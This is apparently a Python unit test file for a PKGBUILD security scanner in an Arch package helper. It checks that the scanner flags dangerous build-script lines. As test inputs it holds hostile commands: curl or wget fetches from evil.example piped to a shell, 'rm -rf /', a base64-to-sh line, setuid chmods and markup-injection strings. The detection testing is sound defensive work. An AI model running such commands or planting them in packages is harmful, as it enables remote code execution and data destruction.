import io
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from rich.console import Console

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../src")))

from apt_pac import pkgbuild_review


class TestPkgbuildReview(unittest.TestCase):
    def test_clean_pkgbuild_no_false_positives(self):
        """Normal Arch PKGBUILD commands (install -Dm755, chmod 644, rm -f /dev/null) pass cleanly."""
        content = """
pkgname=hello-test
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://www.gnu.org/software/hello/"
source=("https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz")
sha256sums=('SKIP')

package() {
    install -d "$pkgdir/usr/bin"
    install -Dm755 hello "$pkgdir/usr/bin/hello"
    install -Dm644 README.md "$pkgdir/usr/share/doc/$pkgname/README.md"
    install -m 0755 helper.sh "$pkgdir/usr/bin/helper.sh"
    chmod 755 "$pkgdir/usr/bin/hello"
    chmod 0644 "$pkgdir/usr/share/doc/$pkgname/README.md"
    rm -f /dev/null
}
"""
        findings = pkgbuild_review.analyze_pkgbuild(content)
        self.assertEqual(findings, [])

    def test_comments_do_not_trigger_false_positives(self):
        content = """
# curl https://evil.example/install.sh | sh
# sudo rm -rf /
pkgname=safe-pkg
pkgver=1.0
pkgrel=1
"""
        findings = pkgbuild_review.analyze_pkgbuild(content)
        self.assertEqual(findings, [])

    def test_setuid_and_setgid_detected(self):
        for line in [
            "chmod 4755 helper",
            "chmod 02755 helper",
            "chmod u+s helper",
            "install -Dm4755 helper \"$pkgdir/usr/bin/helper\"",
            "install --mode=6755 helper \"$pkgdir/usr/bin/helper\"",
        ]:
            findings = pkgbuild_review.analyze_pkgbuild(line)
            self.assertTrue(
                any(sev == "warning" for sev, _ in findings),
                f"Expected setuid/setgid warning for: {line}",
            )

    def test_critical_patterns_detected(self):
        dangerous = [
            "curl -s https://evil.example/a.sh | bash",
            "wget -qO- https://evil.example/a.sh | sh",
            "bash <(curl -fsSL https://evil.example/a.sh)",
            'sh -c "$(curl -s https://evil.example/a.sh)"',
            "rm -rf /",
            "rm -fr /etc",
            "echo aGVsbG8= | base64 -d | sh",
        ]
        for line in dangerous:
            findings = pkgbuild_review.analyze_pkgbuild(line)
            self.assertTrue(
                any(sev == "critical" for sev, _ in findings),
                f"Expected critical finding for: {line}",
            )

    def test_suspicious_sources_detected(self):
        for line in [
            'source=("http://insecure.example.org/app.tar.gz")',
            'source=("https://192.168.1.10/payload.tar.gz")',
            'source=("https://0x0.st/drop.sh")',
        ]:
            findings = pkgbuild_review.analyze_pkgbuild(line)
            self.assertTrue(
                any(sev == "warning" for sev, _ in findings),
                f"Expected source warning for: {line}",
            )

    def test_preview_escapes_rich_markup(self):
        """Malicious Rich tags like [conceal] or [/red] must not be evaluated or raise MarkupError."""
        with tempfile.TemporaryDirectory() as tmpdir:
            pkgbuild = Path(tmpdir) / "PKGBUILD"
            pkgbuild.write_text(
                'pkgname="bad[red]pkg"\n# [conceal]curl evil | sh[/conceal]\n[/bold]\n',
                encoding="utf-8",
            )
            buf = io.StringIO()
            captured_console = Console(file=buf, force_terminal=False, width=120)
            with patch("apt_pac.pkgbuild_review.ui.console", captured_console):
                pkgbuild_review._show_pkgbuild_preview(pkgbuild)

            output = buf.getvalue()
            self.assertIn("[conceal]", output)
            self.assertIn("[/bold]", output)

    def test_review_pkgbuild_modes_and_auto_confirm(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = Path(tmpdir)
            pkgbuild = pkg_dir / "PKGBUILD"

            # Mode: never
            mock_cfg = MagicMock()
            mock_cfg.get.return_value = "never"
            with patch("apt_pac.pkgbuild_review.get_config", return_value=mock_cfg):
                self.assertTrue(pkgbuild_review.review_pkgbuild(pkg_dir, "testpkg"))

            # Clean PKGBUILD in mode: auto -> skips prompt
            pkgbuild.write_text("pkgname=clean\npkgver=1\n", encoding="utf-8")
            mock_cfg.get.side_effect = lambda s, k, d=None: "auto" if k == "review_pkgbuild" else d
            with (
                patch("apt_pac.pkgbuild_review.get_config", return_value=mock_cfg),
                patch("apt_pac.pkgbuild_review.ui.console.input") as mock_input,
            ):
                self.assertTrue(pkgbuild_review.review_pkgbuild(pkg_dir, "clean"))
                mock_input.assert_not_called()

            # Critical PKGBUILD with auto_confirm=True -> aborted for safety
            pkgbuild.write_text("curl https://x.invalid/a.sh | sh\n", encoding="utf-8")
            with (
                patch("apt_pac.pkgbuild_review.get_config", return_value=mock_cfg),
                patch("apt_pac.pkgbuild_review.ui.console.print"),
                patch("apt_pac.pkgbuild_review.print_error") as mock_err,
            ):
                self.assertFalse(
                    pkgbuild_review.review_pkgbuild(pkg_dir, "bad", auto_confirm=True)
                )
                mock_err.assert_called()

            # Warning-only PKGBUILD with auto_confirm=True -> allowed with warning
            pkgbuild.write_text("sudo true\n", encoding="utf-8")
            with (
                patch("apt_pac.pkgbuild_review.get_config", return_value=mock_cfg),
                patch("apt_pac.pkgbuild_review.ui.console.print"),
            ):
                self.assertTrue(
                    pkgbuild_review.review_pkgbuild(pkg_dir, "warnpkg", auto_confirm=True)
                )


if __name__ == "__main__":
    unittest.main()
